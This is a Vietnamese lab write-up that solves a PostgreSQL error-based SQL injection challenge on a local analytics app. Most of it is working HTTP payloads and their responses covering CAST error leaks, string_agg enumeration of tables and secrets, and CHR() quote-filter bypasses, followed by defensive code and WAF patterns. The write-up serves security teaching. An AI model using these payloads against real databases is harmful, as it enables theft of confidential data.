# SQLi-018: PostgreSQL CAST Error-based - Complete Writeup

## 📋 Tổng Quan

**Lab:** SQLi-018  
**Technique:** Error-based SQL Injection  
**DBMS:** PostgreSQL  
**Difficulty:** ⭐⭐ Trung bình  
**Flag:** `FLAG{chr_c0nc4t_p0stgr3sql}`

---

## 🎯 Mục Tiêu

Khai thác lỗ hổng SQL Injection trên PostgreSQL thông qua kỹ thuật **Error-based** sử dụng **CAST to integer**.

---

## 📝 Mô Tả Lab

**Application:** Analytics Dashboard  
**URL:** `http://localhost:5018/analytics?id=1`  
**Vulnerable Parameter:** `id` (GET)

Ứng dụng cho phép xem analytics metrics theo ID. Database có 2 bảng:

- `metrics`: Bảng công khai chứa analytics data (id, metric_name, value)
- `secrets`: Bảng chứa dữ liệu nhạy cảm (id, name, value) - **Mục tiêu**

---

## 🔬 Bước 1: Detection - Phát Hiện SQLi

### 1.1 Test với logic operators

**Request 1 - True condition:**

```http
GET /?id=1+AND+1%3d1-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
HTTP/1.1 200 OK
[Metric data displayed normally]
```

**Request 2 - False condition:**

```http
GET /?id=1+AND+1%3d2-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
HTTP/1.1 200 OK
[No data or different result]
```

✅ **Kết luận:**

- `AND 1=1` → Trả về data (True)
- `AND 1=2` → Không trả về data (False)
- **Có lỗ hổng SQL Injection!**

### 1.2 Xác định DBMS

**Payload:**

```sql
1 AND 1=cast(version() as int)--
```

**Request:**

```http
GET /?id=1+AND+1%3dcast(version()+as+int)-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
ERROR: invalid input syntax for type integer: "PostgreSQL 17.2 (Debian 17.2-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit"
```

✅ **Xác nhận:** PostgreSQL 17.2 database

---

## 🧬 Bước 2: Technique - Hiểu CAST Error-based

### 2.1 CAST là gì?

`CAST` là PostgreSQL function dùng để **convert data type**:

```sql
CAST(expression AS target_type)
-- Hoặc shorthand:
expression::target_type
```

**Khai thác:**

- CAST string → integer → ERROR chứa data!

**Error format:**

```
invalid input syntax for type integer: "DATA_HERE"
```

### 2.2 STRING_AGG - Concatenate nhiều rows

Khi cần lấy **nhiều rows**, sử dụng `string_agg()`:

```sql
string_agg(column_name, delimiter)
```

**Ví dụ:**

```sql
-- Lấy tất cả tables thành 1 string
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
-- Output: "metrics,secrets"
```

---

## 🚀 Bước 3: Enumeration - Liệt Kê Database

### 3.1 Lấy PostgreSQL version

✅ **Đã có ở bước 1.2:** PostgreSQL 17.2

### 3.2 Liệt kê tất cả tables

**Payload:**

```sql
1 AND 1=cast((select string_agg(table_name,',') from information_schema.tables where table_schema='public') as int)--
```

**Request:**

```http
GET /?id=1+AND+1%3dcast((select+string_agg(table_name,',')+from+information_schema.tables+where+table_schema%3d'public')+as+int)-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
ERROR: invalid input syntax for type integer: "metrics,secrets"
```

✅ **Phát hiện 2 bảng:** `metrics`, `secrets`

### 3.3 Liệt kê columns của bảng SECRETS

**Payload:**

```sql
1 AND 1=cast((select string_agg(column_name,',') from information_schema.columns where table_name='secrets') as int)--
```

**Request:**

```http
GET /?id=1+AND+1%3dcast((select+string_agg(column_name,',')+from+information_schema.columns+where+table_name%3d'secrets')+as+int)-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
ERROR: invalid input syntax for type integer: "id,name,value"
```

✅ **Bảng SECRETS có 3 cột:** `id`, `name`, `value`

**Cấu trúc bảng SECRETS:**

```
secrets
├── id      (integer)
├── name    (text)
└── value   (text) ← Flag ở đây!
```

---

## 🏆 Bước 4: Exploitation - Lấy Flag

### 4.1 Extract tất cả giá trị từ cột VALUE

**Payload:**

```sql
1 AND 1=cast((select string_agg(value,',') from secrets) as int)--
```

**Request:**

```http
GET /?id=1+AND+1%3dcast((select+string_agg(value,',')+from+secrets)+as+int)-- HTTP/1.1
Host: localhost:5018
```

**Response:**

```
ERROR: invalid input syntax for type integer: "FLAG{chr_c0nc4t_p0stgr3sql}"
```

🎉 **FLAG:** `FLAG{chr_c0nc4t_p0stgr3sql}`

---

## 📊 Bước 5: Summary - Tổng Kết

### Flow Exploitation (4 bước)

```
1. Detection     → AND 1=1 (true) vs AND 1=2 (false)
2. Version       → PostgreSQL 17.2
3. Tables        → metrics, secrets
4. Columns       → id, name, value
5. Flag          → FLAG{chr_c0nc4t_p0stgr3sql}
```

### Key Payloads

| Step          | Payload                                                  | Result              |
| ------------- | -------------------------------------------------------- | ------------------- |
| **Detection** | `1 AND 1=1--` vs `1 AND 1=2--`                           | Different responses |
| **Version**   | `1 AND 1=cast(version() as int)--`                       | PostgreSQL 17.2     |
| **Tables**    | `string_agg(table_name,',')`                             | metrics,secrets     |
| **Columns**   | `string_agg(column_name,',')` WHERE table_name='secrets' | id,name,value       |
| **Flag**      | `string_agg(value,',')` FROM secrets                     | FLAG{...}           |

---

## 🎓 Kiến Thức Mở Rộng

### CHR() Concatenation (Lab's Focus)

Mặc dù lab này không yêu cầu bypass quotes, **CHR()** là kỹ thuật quan trọng khi:

**Problem:** Quotes bị filter/escape  
**Solution:** Dùng CHR() để tạo strings

**Ví dụ CHR() concatenation:**

```sql
-- Tạo string 'secrets' không dùng quotes
CHR(115)||CHR(101)||CHR(99)||CHR(114)||CHR(101)||CHR(116)||CHR(115)

-- Payload với CHR bypass
1 AND 1=cast((SELECT value FROM secrets WHERE name=CHR(115)||CHR(113)||CHR(108)||CHR(105)||CHR(95)||CHR(48)||CHR(49)||CHR(56)) as int)--
```

**ASCII mapping:**

- `s` = 115
- `e` = 101
- `c` = 99
- `r` = 114
- `e` = 101
- `t` = 116
- `s` = 115

### Alternative Techniques

**1. CAST to numeric (thay vì int):**

```sql
1 AND 1=cast(version() as numeric)--
```

**2. Double colon shorthand:**

```sql
1 AND 1=(version()::int)--
```

**3. Encode to hex:**

```sql
1 AND 1=cast((SELECT '\x'||encode(value, 'hex') FROM secrets LIMIT 1) as int)--
```

**4. CONCAT thay vì ||:**

```sql
1 AND 1=cast(concat('FLAG', (SELECT value FROM secrets LIMIT 1)) as int)--
```

### Python CHR() Generator Script

```python
def str_to_chr(text):
    """Convert string to PostgreSQL CHR() concatenation"""
    chr_codes = [f"CHR({ord(c)})" for c in text]
    return "||".join(chr_codes)

# Example
print(str_to_chr("secrets"))
# Output: CHR(115)||CHR(101)||CHR(99)||CHR(114)||CHR(101)||CHR(116)||CHR(115)
```

---

## 🔐 Defense & Mitigation

### Vulnerable Code (Python/Flask)

```python
@app.route('/analytics')
def analytics():
    metric_id = request.args.get('id', '1')
    # ❌ VULNERABLE: Direct string interpolation
    query = f"SELECT * FROM metrics WHERE id = {metric_id}"
    cursor.execute(query)
```

### Secure Code (Parameterized Query)

```python
@app.route('/analytics')
def analytics():
    metric_id = request.args.get('id', '1')
    # ✅ SECURE: Parameterized query
    query = "SELECT * FROM metrics WHERE id = %s"
    cursor.execute(query, (metric_id,))
```

### Additional Protections

1. **Input Validation:**

   ```python
   if not metric_id.isdigit():
       return "Invalid ID", 400
   ```

2. **Least Privilege:**

   - Database user không cần SELECT trên `information_schema`
   - Revoke unnecessary permissions

3. **Error Handling:**

   ```python
   try:
       cursor.execute(query, (metric_id,))
   except Exception as e:
       # ❌ Don't expose: return str(e)
       # ✅ Generic error:
       return "Database error", 500
   ```

4. **WAF Rules:**
   - Block patterns: `cast(`, `string_agg(`, `information_schema`
   - Monitor for multiple error responses

---

## 🆚 Comparison: SQLi-017 vs SQLi-018

| Aspect            | SQLi-017          | SQLi-018               |
| ----------------- | ----------------- | ---------------------- |
| **Parameter**     | `q` (search)      | `id` (numeric)         |
| **Tables**        | products, secrets | metrics, secrets       |
| **Detection**     | Quote test (`'`)  | Logic test (`AND 1=1`) |
| **CAST type**     | `numeric`         | `int`                  |
| **Special skill** | string_agg basics | CHR() bypass concept   |
| **Port**          | 5017              | 5018                   |

---

## 📚 References

- [PostgreSQL CAST Documentation](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-TYPE-CASTS)
- [PostgreSQL CHR() Function](https://www.postgresql.org/docs/current/functions-string.html)
- [PostgreSQL string_agg()](https://www.postgresql.org/docs/current/functions-aggregate.html)
- [Information Schema](https://www.postgresql.org/docs/current/information-schema.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

**🏁 Lab Completed!** Bạn đã thành công khai thác PostgreSQL error-based SQL Injection với CAST technique!
